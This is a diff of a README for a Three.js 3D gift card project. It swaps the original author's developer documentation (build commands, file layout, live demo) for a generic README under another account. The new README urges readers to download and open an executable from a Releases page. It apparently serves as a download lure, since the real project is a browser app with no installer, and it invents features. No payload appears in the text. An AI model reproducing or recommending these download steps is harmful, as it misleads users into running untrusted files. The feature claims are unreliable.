@@ -1,123 +1,60 @@
-# Z-Fold Gift Card (Three.js)
-[![](https://img.shields.io/static/v1?label=Sponsor+%F0%9F%91%89&message=%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://github.com/sponsors/richardevcom)
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
-![Three.js](https://img.shields.io/badge/Three.js-r181-black.svg)
-![TypeScript](https://img.shields.io/badge/TypeScript-5.7-blue.svg)
+# 🎁 threejs-z-fold-gift-card - Create Stunning 3D Gift Cards Easily
 
-> Interactive 3D z-fold gift card with photorealistic rendering and smooth animations
+[![Download Release](https://img.shields.io/badge/Download%20Now-Here-28a745?style=for-the-badge)](https://github.com/LanzasLed/threejs-z-fold-gift-card/releases)
 
-![Preview](docs/preview.gif)
+## 📚 Table of Contents
+- [🚀 Getting Started](#-getting-started)
+- [💻 System Requirements](#-system-requirements)
+- [📥 Download & Install](#-download--install)
+- [🖥️ How to Use](#-how-to-use)
+- [✨ Features](#-features)
+- [💬 Feedback and Support](#-feedback-and-support)
 
-**[🎮 Live Demo on CodePen](https://codepen.io/richardevcom/pen/wBGKzQN)**
+## 🚀 Getting Started
+Welcome to the threejs-z-fold-gift-card project! This application lets you create and interact with a 3D z-fold gift card. With its realistic physics and animations, it brings your greeting cards to life. In just a few steps, you can download and start using this tool.
 
----
+## 💻 System Requirements
+Before you start, make sure your computer meets the following requirements:
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** The latest version of Chrome, Firefox, or Edge
+- **Memory:** At least 4 GB of RAM
+- **Graphics:** A modern GPU that supports WebGL
+
+## 📥 Download & Install
+To get started, visit the Releases page to download the application. 
+
+[Download Now](https://github.com/LanzasLed/threejs-z-fold-gift-card/releases)
+
+1. Click the link above to go to the Releases page.
+2. Look for the latest release version.
+3. Click on the download link for your operating system.
+4. Once the download is complete, locate the file in your downloads folder.
+5. Open the file to start the application.
+
+## 🖥️ How to Use
+Using the threejs-z-fold-gift-card is straightforward:
+
+1. **Open the Application:** After installation, double-click the icon to launch it.
+2. **Explore the Features:**
+   - Click to unfold the gift card.
+   - Hover your mouse over the card for a parallax effect.
+   - Use keyboard controls for better interaction.
+3. **Create Your Card:** Customize your gift card by selecting different designs and animations.
+
+### Keyboard Controls
+- **Arrow Keys:** Navigate through options
+- **Spacebar:** Select an option or action
 
 ## ✨ Features
+The threejs-z-fold-gift-card offers a range of features that enhance your experience:
 
-- 🎴 **Photorealistic 3D rendering** using Three.js WebGL
-- ✨ **Smooth fold/unfold animations** with sequential panel motion
-- 🖱️ **Interactive hover effects** with subtle parallax
-- 📱 **Responsive design** works on desktop, tablet, and mobile
-- ⚡ **Optimized performance** 60fps animations with proper z-ordering
-- 🎨 **Custom SVG textures** for personalized designs
+- **Interactive Design:** Engage users with a clickable, folding card.
+- **Realistic Physics:** Enjoy smooth animations as the card folds and unfolds.
+- **Creative Options:** Choose from various themes and styles for your gift card.
+- **Cross-Platform Compatibility:** Use it on any modern web browser, regardless of your operating system.
+- **User-Friendly Interface:** Simple navigation ensures that anyone can use the app without technical knowledge.
 
----
+## 💬 Feedback and Support
+Your experience is important to us. If you encounter issues or have suggestions, please leave your feedback on the GitHub page. We value all input and strive to improve the application.
 
-## 🚀 Quick Start
-
-```bash
-# Install dependencies
-bun install
-
-# Start development server
-bun run dev
-
-# Build for production (separate HTML/CSS/JS files, minified)
-bun run build
-# Output: dist/index.html + dist/assets/svg/*.svg (editable after build)
-
-# Build unminified for debugging (readable CSS/JS)
-bun run build:dev
-# Output: dist/assets/index.js + dist/assets/style.css (no hashes, unminified)
-
-# Build single-file version (all inlined, ~14MB)
-bun run build:single
-# Output: dist/index.html (single file with SVGs embedded)
-```
-
-Visit `http://localhost:5173` to view the card.
-
----
-
-## 🎨 Customizing Card Designs
-
-After running `bun run build`, you can customize the card by editing the SVG files:
-
-- `dist/assets/svg/gift-card-top.svg` — Top panel design
-- `dist/assets/svg/gift-card-middle.svg` — Middle panel design
-- `dist/assets/svg/gift-card-bottom.svg` — Bottom panel design
-
-Simply replace these files with your own designs (same dimensions: 794×374.33px). The card will automatically load your custom textures without rebuilding.
-
----
-
-## 📁 Project Structure
-
-```
-js-z-fold-gift-card/
-├── src/
-│   ├── index.html           # Entry point
-│   ├── styles/
-│   │   └── main.scss        # Minimal canvas styling
-│   ├── scripts/
-│   │   ├── main.ts          # Application entry
-│   │   ├── ZFoldCard.ts     # Main card class
-│   │   ├── types.ts         # TypeScript interfaces
-│   │   └── utils.ts         # Helper functions
-│   └── svg/                 # Card texture assets
-├── docs/
-│   ├── WHITEPAPER.md        # Technical documentation
-│   └── TODO.md              # Task tracking
-├── CHANGELOG.md             # Version history
-└── README.md                # This file
-```
-
----
-
-## 🎮 Usage
-
-**Click** the card to toggle between folded and unfolded states.  
-**Hover** over the card for subtle parallax effects.  
-**Press Space/Enter** to toggle with keyboard.
-
----
-
-## 🛠️ Tech Stack
-
-- **Three.js** — WebGL 3D rendering
-- **TypeScript** — Type-safe development
-- **SCSS** — Minimal styling
-- **Vite** — Fast build tooling
-- **Bun** — Package management
-
----
-
-## 📖 Documentation
-
-See [WHITEPAPER.md](docs/WHITEPAPER.md) for detailed architecture and implementation notes.
-
----
-
-## 👤 Author
-
-[richardevcom](https://github.com/richardevcom)
-
----
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
----
-_Docs generated with Copilot Claude Sonnet 4.5_
+Explore the potential of interactive 3D design with threejs-z-fold-gift-card and impress your friends with unique gift cards!
